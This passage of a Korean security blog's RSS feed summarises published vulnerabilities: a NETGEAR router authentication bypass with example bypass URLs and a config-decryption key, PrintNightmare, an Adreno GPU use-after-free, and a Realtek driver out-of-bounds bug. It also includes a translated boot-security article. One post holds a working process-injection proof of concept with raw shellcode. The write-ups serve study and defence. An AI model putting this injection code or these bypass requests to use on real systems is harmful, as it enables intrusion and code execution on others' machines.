class="hljs-title">CreateFileA</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/auth-bypass/">auth bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/efi/">efi</category>
      
      <category domain="https://hackyboiz.github.io/tags/boot/">boot</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] NETGEAR firmware 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</link>
      <guid>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</guid>
      <pubDate>Fri, 02 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/2021/06/30/micros</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/">Microsoft finds new NETGEAR firmware vulnerabilities that could lead to identity theft and full system compromise</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NETGEAR DGN-2200v1 시리즈</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>마이크로소프트에서 NETGEAR DGN-2200v1 시리즈 라우터에서 네트워크 보안을 손상시킬 수 있는 세 가지 취약점을 발견하였습니다.</p><p><strong>인증 우회를 통한 라우터 관리자 페이지 접근</strong></p><p>HTTPd 내부 처리 코드에서 <code>strstr</code>을 사용하여 전체 문자열에서 <code>.jpg</code>, <code>.gif</code>, <code>ess_</code> 등의 문자열이 마지막에 존재하는지 확인합니다. 따라서 GET 파라미터를 통해 인증이 필요한 페이지 뒤에 해당 필터링이 걸린 문자를 넣으면 인증을 우회하고 페이지에 접근이 가능합니다.</p><pre><code class="hljs asciidoc">예시) <span class="hljs-link">http://127</span>[<span class="hljs-string">.</span>]<span class="hljs-link">0[.]0</span>[<span class="hljs-string">.</span>]<span class="hljs-link">1/admin.htm?pic.gif</span></code></pre><p><strong>Cryptographic side-channel을 통해 저장된 라우터 자격 증명 가져오기</strong></p><p>라우터에서 HTTPd 페이지에 인증해야하는 경우 HTTP basic authentication이 필요합니다. 사용자 이름과 비밀번호는 base64로 인코딩되고 HTTP 헤더로 전송된 후 라우터의 메모리에 저장된 이름과 비밀번호와 비교해 확인합니다. 라우터는 파일 시스템 외부에 있는 NVRAM에 인증 정보를 저장하므로 이를 추출할 수 있습니다.</p><p>하지만 인증 부분에서 이름과 비밀번호를 <code>strcmp</code>를 사용하여 비교합니다. <code>strcmp</code>는 NUL을 만나거나 일치하지 않는 부분이 생길 때까지 문자열을 비교하므로 실패할 때까지 걸리는 시간을 통해 side-channel attack이 가능합니다.</p><p><strong>저장된 민감한 정보 탐색</strong></p><p>위에서 설명드린 인증 우회 취약점으로 인증이 필요한 페이지에 접근하는 것 뿐만 아니라 라우터의 설정 백업/복구 기능을 사용하여 사용자 이름, 비밀번호를 가져올 수 있습니다. <code>http://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif</code>로 접근하면 설정 파일을 얻을 수 있습니다. 해당 파일은 DES로 암호화 되어있으며, 백업/복구 기능의 코드에서 <code>NtgrBak</code> 키를 통해 암호화 됩니다. 이를 통해 해커는 NVRAM에 저장된 암호를 얻을 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/side-channel-attack/">side-channel attack</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/netgear/">netgear</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1675: Windows Spooler Service 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</link>
      <guid>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</guid>
      <pubDate>Thu, 01 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/afwu/PrintNightmare&quot;&gt;PrintNightmare (C</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/afwu/PrintNightmare">PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PrintNightmare라는 이름의 Printer Spooler 원격 코드 실행 취약점의 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 프린터 서버에 드라이버를 추가하거나 업데이트하는 과정에서 발생합니다. <code>RpcAddPrinterDriver</code> 함수는 프린터 드라이버를 추가할 때 Spooler Service에 대한 검사를 수행합니다.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-function">__int64 __fastcall <span class="hljs-title">SplAddPrinterDriverEx</span><span class="hljs-params">(.. <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4 ..)</span></span>&#123;<span class="hljs-number">2</span>:...<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>( !_bittest((<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *)&amp;a4, <span class="hljs-number">0xF</span>u))<span class="hljs-number">5</span>:v11 = a7;<span class="hljs-number">6</span>:<span class="hljs-keyword">if</span>(v11 &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)ValidateObjectAccess(<span class="hljs-number">0</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">0</span>i64)<span class="hljs-number">7</span>:<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<span class="hljs-number">8</span>:<span class="hljs-keyword">return</span> InternalAddPrinterDriverEx(lpString1, a2, a3, a4, (struct _INISPOOLER *)a5, a6, v11, <span class="hljs-number">0</span>i64);<span class="hljs-number">9</span>:<span class="hljs-number">10</span>:&#125;</code></pre><p>line 4와 5에서 <code>a4</code>는 유저 권한의 사용자가 제어할 수 있으며 해커는 이를 이용해 검사를 우회하고 악성 DLL을 타겟 서버에 설치할 수 있습니다. 또한 프린터 드라이버 정보 구조체의 <code>pConfigFile</code>이 UNC 경로가 허용된다는 점을 이용해 원격으로 타겟 서버에 로드할 수 있으며 드라이버 업그레이드의 백업 기능으로 액세스 충돌을 우회하고 로드된 악성 dll을 spooler service에 삽입할 수 있습니다.</p><blockquote><p>UNC(Universal Naming Convention) : 네트워크 상의 공유 파일 경로 포맷 ex) \servername\sharename\path\filename</p></blockquote><p>해당 취약점에 대해 Microsoft는 2021년 6월 8일 Patch Tuesday 릴리즈에서 패치했지만 패치가 취약점을 해결하지 못한 것으로 알려졌습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0">https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/printer-spooler/">printer spooler</category>
      
      <category domain="https://hackyboiz.github.io/tags/printnightmare/">printnightmare</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</title>
      <link>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/</link>
      <guid>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/</guid>
      <pubDate>Wed, 30 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.github.io/0days-in-the-wild/0da</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html">CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm Adreno GPU</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Qualcomm Adreno GPU는 여러 프로세스의 메모리 매핑을 동싱에 처리하는 과정에서 Use-after-free 취약점이 발생합니다. GPU는 여러 VMA(Linux Virtual Memory Access)와 메모리 매핑을 공유하고 하나의 매핑이 닫히면 <code>kpsl_gpumem_vm_close</code> 함수를 호출해 <code>entry-&gt;memdesc.useraddr</code> 필드를 초기화합니다. 문제는 해당 필드가 여러 VMA에 공유되며 entry가 이미 매핑되었는지 확인하는 데 사용되므로 나머지 VMA에 의도하지 않은 버그가 발생합니다. Linux kernel mmap implementation에 따라 서로 다른 프로세스에서 동시에 호출이 불가능한 함수 <code>kpsl_get_unmapped_area</code>를 두 프로세스에서 같은 GPU 매핑에 대해 경쟁하도록 race condition을 발생시킬 수 있습니다. 따라서 구조체 <code>kpsl_mem_entry</code>가 서로 다른 두 프로세스에서 동시에 사용되어 use-after-free로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/race-condition/">race-condition</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-32537: Realtek 드라이버의 OOB Access 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/</link>
      <guid>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/</guid>
      <pubDate>Tue, 29 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0vercl0k/CVE-2021-32537&quot;&gt;CVE-2021-3253</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-32537">CVE-2021-32537: Out-of-bounds access in RTKVHD64 leading to pool corruption.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Surface Book/Pro</li><li>Lenovo Thinkpad</li><li>Dell XPS 13</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Realtek의 오디오 드라이버에서 OOB Access 취약점이 발견되어 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 오디오 드라이버 <code>RTKVHD64.sys</code>에서 발생합니다. 해당 드라이버는 초기화 중 <code>PcAddAdapterDevice</code> 함수의 파라미터인 <code>StartDevice</code>에 의해 호출된 <code>InitDeviceExtension</code> 함수에서 커널 풀에 <code>MEVT</code> 구조체를 할당합니다.</p><pre><code class="hljs c">devext-&gt;unk-&gt;events = ExAllocatePoolWithTag(pooltype, 0x5F0ui64, &#x27;mEvt&#x27;);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> &#123;</span>    PKSPIN_LOCK lock;    PVOID       event;    UINT64      someflag;&#125; <span class="hljs-comment">/* sizeof == 0x18 */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MEVT</span> &#123;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> <span class="hljs-title">array</span>[63];</span>    UINT64 flags;&#125; <span class="hljs-comment">/* sizeof == 0x18*63 + 8 == 0x5f0 */</span></code></pre><p><code>MEVT</code>의 <code>EVT</code> 구조체는 63개의 고정된 크기의 배열입니다.</p><pre><code class="hljs c">input_index = *(_DWORD *)IrpSystemBuffer;v5 = Crash(mevts, <span class="hljs-built_in">stack</span>-&gt;FileObject, unk, &amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index].event,        (KSPIN_LOCK *)&amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index]);</code></pre><p>드라이버에 <code>0x225f04</code> IOCTL 코드를 전송하면 유저버퍼인 <code>IrpSystemBuffer</code>의 첫 번째 DWORD 데이터가 <code>input_index</code>에 저장됩니다. <code>input_index</code>는 위 <code>Crash</code> 함수에서 <code>(KSPIN_LOCK *)&amp;mevts-&gt;array[input_index]</code>와 같이 <code>MEVT</code>의 <code>EVT</code> 배열에 접근할 때 인덱스로 사용됩니다. 따라서 해커는 IOCTL 입력 버퍼를 통해 <code>input_index</code>를 임의의 값으로 설정할 수 있어 Out Of Bound Access로 이어집니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/realtek/">realtek</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bound/">out-of-bound</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Process Injection without Write/Execute Permission</title>
      <link>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/</link>
      <guid>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/</guid>
      <pubDate>Mon, 28 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://xret2pwn.github.io//process-inection/&quot;&gt;Process In</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xret2pwn.github.io//process-inection/">Process Injection without Write/Execute Permission</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 블로그에서 non-writable allocation에 shellcode를 작성하고 non-executable allocation에서 이를 실행하는 방법이 공개되었습니다.</p><p>먼저 non-writable allocation에 <code>VirtualAlloc</code>을 통해 <code>PAGE_EXECUTE_READ</code> 권한을 부여하여 shellcode를 작성합니다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Allocation created successfully %p \n&quot;</span>, exec);<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Shellcode wrote successfully.&quot;</span>);&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] No permission to write the shellcode.&quot;</span>);&#125;</code></pre><p><img src="https://xret2pwn.github.io/assets/img/posts/Process_Injection/cpp_write_the_shellcode_executed.png" alt="screenshot_4"></p><p>성공적으로 shellcode가 작성됨을 확인할 수 있습니다. 그 후 해당 영역 (non-executable allocation)에 <code>PAGE_READONLY</code> 권한을 부여합니다. 하지만 DEP (Data Execution Prevention) 보호 기법으로 인해 메모리에서 직접 shellcode를 실행할 수 없습니다. 따라서 DEP가 걸려있지 않은 프로세스를 찾아 해당 프로세스에 shellcode를 injection 하면 읽기/쓰기 권한 없이 shellcode를 실행할 수 있습니다.</p><p>POC는 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =        <span class="hljs-string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&quot;</span>        <span class="hljs-string">&quot;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&quot;</span>        <span class="hljs-string">&quot;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&quot;</span>        <span class="hljs-string">&quot;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&quot;</span>        <span class="hljs-string">&quot;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&quot;</span>        <span class="hljs-string">&quot;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&quot;</span>        <span class="hljs-string">&quot;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&quot;</span>        <span class="hljs-string">&quot;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&quot;</span>        <span class="hljs-string">&quot;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&quot;</span>        <span class="hljs-string">&quot;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&quot;</span>        <span class="hljs-string">&quot;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&quot;</span>        <span class="hljs-string">&quot;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&quot;</span>        <span class="hljs-string">&quot;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&quot;</span>        <span class="hljs-string">&quot;\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24&quot;</span>        <span class="hljs-string">&quot;\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff&quot;</span>        <span class="hljs-string">&quot;\x55\x08&quot;</span>;    HANDLE processHandle;    HANDLE remoteThread;    PVOID remoteBuffer;    DWORD oldPerms;    DWORD PID = <span class="hljs-number">17968</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Injecting to PID: %i&quot;</span>, PID);    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);    remoteBuffer = VirtualAllocEx(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);    WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);    VirtualProtectEx(processHandle, (LPVOID)<span class="hljs-keyword">sizeof</span>(processHandle), <span class="hljs-keyword">sizeof</span>(shellcode), PAGE_READONLY, &amp;oldPerms);    remoteThread = CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    CloseHandle(processHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/process-injection/">process injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/cpp/">cpp</category>
      
      <category domain="https://hackyboiz.github.io/tags/shellcode/">shellcode</category>
      
      <category domain="https://hackyboiz.github.io/tags/redteam/">redteam</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Measured Boot와 멀웨어 시그니처: Windows Loader에서 발견된 두 가지 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/</link>
      <guid>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/</guid>
      <pubDate>Sun, 27 Jun 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요 L0ch입니다!&lt;/p&gt;
&lt;p&gt;오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요 L0ch입니다!</p><p>오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이해를 돕기 위한 내용이 잘 정리되어 있더라구요. 개인적으로 재밌게 읽어서 정리도 할 겸 번역글로 남겨봤습니다!</p><p>오역과 의역덩어리 번역글이니 지적은 매우 환영이에요..!</p><blockquote><p>원문 : <a href="https://bi-zone.medium.com/measured-boot-and-malware-signatures-exploring-two-vulnerabilities-found-in-the-windows-loader-5a4fcc3c4b66">Measured Boot and Malware Signatures: exploring two vulnerabilities found in the Windows loader</a></p></blockquote><hr><h1 id="Introduction-to-Boot-Security"><a href="#Introduction-to-Boot-Security" class="headerlink" title="Introduction to Boot Security"></a>Introduction to Boot Security</h1><p>Boot Security에는 Verified Boot와 Measured Boot라는 두 가지 주요 개념이 있다.</p><h2 id="Verified-Boot"><a href="#Verified-Boot" class="headerlink" title="Verified Boot"></a>Verified Boot</h2><p>Verified Boot 프로세스는 신뢰할 수 있는 디지털 서명이 되지 않은 구성 요소가 부팅 중에 실행되지 않도록 한다. 이 프로세스는 서명되지 않았거나 제대로 서명되지 않은 부팅 구성 요소 (예 : 부팅 관리자 및 펌웨어 드라이버)가 시스템에서 실행되는 것을 차단하는 기능인 Secure Boot로 구현된다.</p><h2 id="Measured-Boot"><a href="#Measured-Boot" class="headerlink" title="Measured Boot"></a>Measured Boot</h2><p>Measured Boot 프로세스는 부팅 중 실행하기 전 모든 구성 요소를 기록한다. 이는 변조 방지 방식(tamper-proof way)으로 유지되며 신뢰할 수 있는 플랫폼 모듈 (Trusted Platform Module, TPM)을 사용하여 구현된다. TPM은 펌웨어 및 중요 운영 체제 구성 요소의 해시를 저장하는 데 사용되어 악성 프로그램이 해시를 변경하는 것을 방지한다. </p><p>Verified Boot와 Measured Boot는 동시에 사용할 수 있다. 이러한 개념과 Windows에서의 구현에 대한 기술적 세부 사항은 <a href="https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/overview">Reference [1]</a>과 <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process">Reference [2]</a>에서 찾을 수 있다.</p><p>위 두 가지 이외에도 다음과 같이 네 가지의 개념이 있다.</p><ul><li>Post-boot verification - 부팅 이후 확인</li><li>Booting from read-only media - 읽기 전용 미디어에서 부팅</li><li>Booting from a read-only volume(image) - 읽기 전용 볼륨(이미지)에서 부팅</li><li>pre-boot verification - 부팅 전 확인</li></ul><h2 id="Post-boot-verification"><a href="#Post-boot-verification" class="headerlink" title="Post-boot verification"></a>Post-boot verification</h2><p>Post-boot verification은 부팅 프로세스가 완료된 이후 또는 후반 단계에서 시작된 프로그램에 의해 수행된다. 해당 프로그램은 이전에 실행된 OS 구성요소와 데이터의 무결성을 확인한다. 이 방식은 더 높은 권한으로 실행 중인 멀웨어의 경우 프로그램의 파일 읽기 요청을 가로채고 반환되는 파일 데이터를 제어함으로써 우회가 가능하나 그럼에도 안티 멀웨어 소프트웨어, 엔드포인트 탐지 및 대응 솔루션과 암호화 구성 요소의 미티게이션으로써 사용할 가치가 있다.</p><h2 id="Booting-from-read-only-media"><a href="#Booting-from-read-only-media" class="headerlink" title="Booting from read-only media"></a>Booting from read-only media</h2><p>읽기 전용 미디어에서 부팅하는 것은 BIOS 및 UEFI와 같은 OS 시작 전 환경(pre-OS environment)에서 사용된다. 이러한 개념이 적용된 온라인 뱅킹을 위한 실시간 배포 방식은 이미 수년 전에 <a href="http://thinkinghard.com/secureinternetbanking/index.html">제안되었으며</a> 현재는 재택근무 시 보안을 위해 제안되기도 한다. 이는 기존의 전통적인 멀웨어에 완벽하게 대응해 대부분의 멀웨어로부터 시스템을 보호할 수 있다.</p><p>그러나 악성 프로그램이 OS 이전 환경에 접근할 수 있으면 우회가 가능하다. 이동식 미디어에서 부팅되는 OS를 속여 기존 미디어에 저장된 코드를 실행할 수 있다. 이는 BIOS 또는 UEFI가 부팅 드라이브에서 데이터를 읽을 때 기본 스토리지 드라이버로 전환하는 동안 트리거할 수 있으며 관련된 코드 실행 이슈에 대한 자세한 내용은 <a href="https://dfir.ru/2018/07/21/a-live-forensic-distribution-executing-malicious-code-from-a-suspect-drive/">이전 글에서</a> 확인할 수 있다.</p><h2 id="Booting-from-a-read-only-volume"><a href="#Booting-from-a-read-only-volume" class="headerlink" title="Booting from a read-only volume"></a>Booting from a read-only volume</h2><p>읽기 전용 볼륨(이미지)에서 부팅하는 것 또한 비슷한 개념이지만 변경 불가능한 OS 파일만 읽기 전용 볼륨에 저장된다. 이 볼륨은 해시 또는 해시 트리를 사용하여 무결성을 검증한다. 해시 또는 해시 트리의 루트 해시는 하드웨어로 보호되는 루트에 의해 서명되고 검증되며 이 접근 방식은 기존의 검증된 부팅 구현과 관련이 있다. 더 